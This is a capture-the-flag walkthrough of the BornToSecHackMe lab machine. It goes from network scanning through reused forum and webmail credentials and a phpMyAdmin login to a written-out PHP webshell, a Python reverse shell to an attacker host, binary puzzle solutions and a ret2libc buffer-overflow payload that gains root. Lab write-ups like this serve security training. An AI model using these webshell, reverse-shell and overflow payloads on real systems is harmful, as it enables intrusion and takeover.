## find out the ip address of the machine 


```
using this command nmap 10.11.100.0/24:

  Nmap scan report for 10.11.100.4
  Host is up (0.0013s latency).
  Not shown: 994 closed tcp ports (conn-refused)
  PORT    STATE SERVICE
  21/tcp  open  ftp
  22/tcp  open  ssh
  80/tcp  open  http
  143/tcp open  imap
  443/tcp open  https
  993/tcp open  imaps
```

## find the  sublinks
```
dirb https://10.11.100.4

---- Scanning URL: https://10.11.100.4/ ----
+ https://10.11.100.4/cgi-bin/ (CODE:403|SIZE:288)
==> DIRECTORY: https://10.11.100.4/forum/
==> DIRECTORY: https://10.11.100.4/phpmyadmin/
+ https://10.11.100.4/server-status (CODE:403|SIZE:293)
==> DIRECTORY: https://10.11.100.4/webmail/
```

## analyze the forum
in the forum theres an entry called "login problem" in it we find a users pasword
    ```
    username: lmezard
    password: !q\]Ej?*5K5cy*AJ
    ```
    - it works , i also got the email from the user profile
    email: laurie@borntosec.net

### The same password was used to log in to webmail
    user: laurie@borntosec.net
    password: !q\]Ej?*5K5cy*AJ

+ on the inbox theres an email that contains the credentials to a databases 


## access phpMyAdmin

login: root

password: Fg-'kKXBj87E:aJ$

##webshell

`SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/pyload.php"`

#####to access the webshell we have to use these commands, by encoding them into the url

`export RHOST="IP";export RPORT=3412;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`
#####after encoding it
`export%20RHOST%3D%22 "IP of the hacking machine, not the webserver" %22%3Bexport%20RPORT%3D3412%3Bpython%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fsh%22%29%27%0A`

#####final link
`forum/templates_c/pyload.php?cmd=export%20RHOST%3D%22{IP}%22%3Bexport%20RPORT%3D3412%3Bpython%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fsh%22%29%27%0A`
## GET a foothold on the machine 

open a port and start listening for incoming connection

nc -lk -p 3412

encode the pyload and pass it to cmd in the browser : https://IP/forum/templates_c/pyload.php?cmd=(encoded pyload)

┌──(kali㉿kali)-[~]
└─$ nc -lk -p 3412
$ whoami
whoami
www-data




# find user lmezard's password
##### find files with a stickybit permission 

find / -type f -user www-data 2>/dev/null

```
notice this file /rofs/home/LOOKATME/password

cat /rofs/home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"

run su lmezard
password: G!@M6f4Eatau{sF"
```
# find user lauries's password
in the user's home folder we find these files

```
lmezard@BornToSecHackMe:~$ ls
fun  README
```

by examining the file named fun, you will realize its an archive

```
lmezard@BornToSecHackMe:~$ file fun
fun: POSIX tar archive (GNU)
```

to extract it you could either chmod the home to gain rights to extract in the current directory, or you can copy it to var/tmp and extract it there

```
lmezard@BornToSecHackMe:~$ tar -xf fun
```

you get a folder called ft_fun which contains many files.

upon examining these files, you realize  that when combined together they make up one c program that has a ton of misleading comments. the trick will be to figure out the right order ofthe files

lets examin one of the files

```
lmezard@BornToSecHackMe:~/ft_fun$ cat 4ELRN.pcap
}void useless() {
//file237
```
you will notice that all the files end with //file number

after multiple attemps i figured that the comment at the endo f each file is its actual order, so the solution would be to rename all the files each one acording to the number in its last line

to achieve this , i made a script using python called name_corrector.py which can be found in the scripts folder

name_correcter.py is just a script that loops through all the files inside the ft_fun directory, and prints out a linux command that renames the current file with its correct order number, the order number can be found in the final line of each file,
```
┌──(kali㉿kali)-[~]
└─$ python name_correcter.py | sh
                                                                                          
┌──(kali㉿kali)-[~]
└─$ cd ft_fun 
                                                                                          
┌──(kali㉿kali)-[~/ft_fun]
└─$ for file in *; do (cat "${file}"; echo \n) >> combine.c; done
                                                                                          
┌──(kali㉿kali)-[~/ft_fun]
└─$ gcc combine.c 
                                                                                          
┌──(kali㉿kali)-[~/ft_fun]
└─$ ./a.out 
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit                                                                                          

┌──(kali㉿kali)-[~]
└─$ echo -n  Iheartpwnage |  sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```


# find user thor's password 

after connecting to laurie you will find these files in their home directory
```
laurie@BornToSecHackMe:~$ ls
bomb  README
```

bomb is a program that prompts you for input 6 times, each time it checks if what your input is correct using a different function for each input

README file is crucial for finding the right password, as it offers a hint in form of one character from each of the 5 user inputs. this is important because some levels can accept multiple solutions

```
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

###these are the functions that check your input in order:

####phase_1: checks if the input is equal to "Public speaking is very easy."
```
   0x08048b2c <+12>:	push   0x80497c0
=> 0x08048b31 <+17>:	push   eax
   0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>

(gdb) x /s 0x80497c0
0x80497c0:	"Public speaking is very easy."
```


so the user input is compared against the following string "Public speaking is very easy."

####phase_2: checks if the input is equal to "1 2 6 24 120 720"

first condition is to check if the first number is equal to 1
```
  0x08048b63 <+27>:	cmp    DWORD PTR [ebp-0x18],0x1
```
then it proceeds to a loop through the array of the numbered you entered
the loop startsat index 1 ; which is the second element
then it compares the number at the current index to (index + 1) * previous number, they must be equal to eachother

so this makes it easy the correct number for each elemet is (index + 1) * previous number, lets start from the beginning at index 1;
```
current index  = 1, previous number = 1   (1 + 1)* 1 = 2
current index  = 2, previous number = 2   (2 + 1)* 2 = 6 
current index  = 1, previous number = 1   (3 + 1)* 6 = 24
current index  = 1, previous number = 1   (4 + 1)* 24 = 120
current index  = 1, previous number = 1   (5 + 1)* 120 = 720
```



####phase_3: checks if the input is equal to "1 b 214"

first the function calls scanf with these flags: `"%d %c %d"`   (one int one character then one int)
then a switch case condition is called, checking if the first number is equal to either one of the numbers from 0 to 6, and each one of these conditions checks if the character and last number are equal to a specific value

this pretty much means there are 7 correct solutions to this phase, but acording to the `README` file the 3rd input's character choice must be `'b'`
so all we need to do is look for the condition that checks for a `'b'` character

the ascii value of `'b'` is:

```
(gdb) p 'b'
$7 = 98 'b'
```
and the hex value of 98 is `0x62`
now we simply look for the mention of `0x62`

```
=> 0x08048c00 <+104>:	mov    bl,0x62
   0x08048c02 <+106>:	cmp    DWORD PTR [ebp-0x4],0xd6
```

the second number is `0xd6` which is `214`
now to find the first number knowing that they go from 1 to 7, i just went with brute force, and it turns out `1` is the right number.


####phase_4: checks if the input is equal to  "9"

firstly the function calls scanf with this flag `"%d"`, taking in an int

and then it checks if the number is bigger than 0, then passes the number as a parameter to function func4 if the parameter is equal or less than 1, then func4 returns 1, else function func4 recusivly calls itself twice, `func4(parameter -1)` and `func4(parameter - 2)` then it returns the sum of the result of those two calls, ofcourse again inside of each recurive call to func4, another func4 is called in the same manner, and so on.
then once func4 is done, its final result must be equal to 55

i managed to reverse this so i can find the right number that leads to the final result of 55. the script can be found in phase_4.py

####phase_5:  checks if the input is equal to  "opekmq"

firsty, the function checks that the input string's length is 6
then theres a while loop through the characters of the string, each character is anded with 0xf then the result is used as the index of a character from this string `"isrveawhobpnutfg"`
it does this to each character and by the end we get a whole new string with the characters taken from `"isrveawhobpnutfg"`, and this new string should be `"giants"`. so in order to reverse this

i made a script that takes `"aaaaaa"`  as the initial input, then increments each character after anding it with `0xf`, and using that number as an index on the string `"isrveawhobpnutfg"`. if it equals to its equivalant character from `"giants"` then the scrip passes to the next character from the initial input. at the end i get a string that solves phase_5.



####phase_6:
```
void phase_6(int param_1[6]) {
  int i;
  int *myOrder[6];
  int myInput[6];
  
  // Read in 6 integers
  read_six_numbers(param_1, myInput);
  
  // check if the numbers are inferior to 5 after substracting -1 from each number. and also checking if the numbers are unique
  for (i = 0; i < 6; i++) {
    if (myInput[i] - 1 < 5) {
      explode_bomb();
    }
    for (int j = i + 1; j < 6; j++) {
      if (myInput[i] == myInput[j]) {
        explode_bomb();
      }
    }
  }
  
  // fill myOrder with the pointers of node1 nodes according to the order of myInput
  for (i = 0; i < 6; i++) {
    node *current_node = &node1;
    int count = 1;
    while (count < myInput[i]) {
      current_node = current_node->next;
      count++;
    }
    myOrder[i] = current_node;
  }
  
  // Link the myOrder together in order
  for (i = 0; i < 5; i++) {
    myOrder[i]->next = myOrder[i + 1];
  }
  myOrder[5]->next = NULL;
  
  // Check that the data in the myOrder is strictly decreasing
  current_node = nodes[0];
  for (i = 0; i < 5; i++) {
    if (current_node->data >= current_node->next->data) {
      explode_bomb();
    }
    current_node = current_node->next;
  }
}
```

now to solve this we need know the values of data in the node1 linked list
```
(gdb) x/3wx 0x804b26c
0x804b26c <node1>:	0x000000fd	0x00000001	0x0804b260 //(0x0804b260 is the address of the next node and 0x00000001 is the index of the current node)
(gdb) x/3wx 0x0804b260
0x804b260 <node2>:	0x000002d5	0x00000002	0x0804b254
(gdb) x/3wx 0x0804b254
0x804b254 <node3>:	0x0000012d	0x00000003	0x0804b248
(gdb) x/3wx 0x0804b248
0x804b248 <node4>:	0x000003e5	0x00000004	0x0804b23c
(gdb) x/3wx 0x0804b23c
0x804b23c <node5>:	0x000000d4	0x00000005	0x0804b230
(gdb) x/3wx 0x0804b230
0x804b230 <node6>:	0x000001b0	0x00000006	0x00000000
```
printing the values in decimal
```
(gdb) p 0x000000fd
$1 = 253
(gdb) p 0x000002d5
$2 = 725
(gdb) p 0x0000012d
$3 = 301
(gdb) p 0x000003e5
$4 = 997
(gdb) p 0x000000d4
$5 = 212
(gdb) p 0x000001b0
$6 = 432
```
so the order in which the values would be stricktly increasing is:
```
(gdb) 4 2 6 3 1 5
```

putting all the strings together makes the password for thor



`thor:Publicspeakingisveryeasy.126241207201b2149opekmq426135`

# find user zaz's password

the home folder contains a file called turtle, upon examining it you realize it has many movement instructions, and at the very end it says `"Can you digest the message? :)"`
to my knowledge, digest has something to do with hashs so i tried hashing the file name, and its content without success. later i realized i just have to find a tool that can draw all of those instruction movements
we found this one

http://www.logointerpreter.com/turtle-editor.php


but this one uses different words for various movements, and its certainly not in french. so i created a script that replaces the instructions from french to the correct ones acording to the site. its really just a matter of search and replace. nothing fancy

enterign teh instructions in the website we get a rough sketch of the word `SLASH`
lets digest it:
```
┌──(kali㉿kali)-[~]
└─$ echo -n SLASH > hi

┌──(kali㉿kali)-[~]
└─$ md5sum  hi
646da671ca01bb5d84dbb5fb2238dc8e  hi
```


# find root's password

theres an executable called exploit_me

immidiatly after analyzing it using gdb we realize its vulnerable to buffer overflow exploit.
```
   0x0804840d <+25>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048410 <+28>:	add    eax,0x4
   0x08048413 <+31>:	mov    eax,DWORD PTR [eax]
   0x08048415 <+33>:	mov    DWORD PTR [esp+0x4],eax
   0x08048419 <+37>:	lea    eax,[esp+0x10]
   0x0804841d <+41>:	mov    DWORD PTR [esp],eax
=> 0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
```
the program takes in a parameter.
the function strcpy is called which copies the string in the parameter to an address in the stack.
```
(gdb) x/5wx $esp
0xbffff690:	0xbffff6a0	0xbffff8ff	0x00000001
```
it copies a string from `0xbffff8ff` to `0xbffff6a0`
i decided to use ret2libc exploit by overwriting teh return address of the main
to do this we calculate the offset from the destination address to the return address

```
(gdb) p $ebp+4
$2 = (void *) 0xbffff72c
(gdb) p 0xbffff72c - 0xbffff6a0
$3 = 140
```
offset is 140 so:
```
(gdb) p system
$4 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb)  find &system,+99999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
```
```
python -c 'print "a"*140 + "\xb7\xe6\xb0\x60"[::-1] + "aaaa"+ "\xb7\xf8\xcc\x58"[::-1]' > /tmp/ok
zaz@BornToSecHackMe:~$ ./exploit_me $(cat /tmp/ok)
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`��aaaaX��
# whoami
root
```
###the end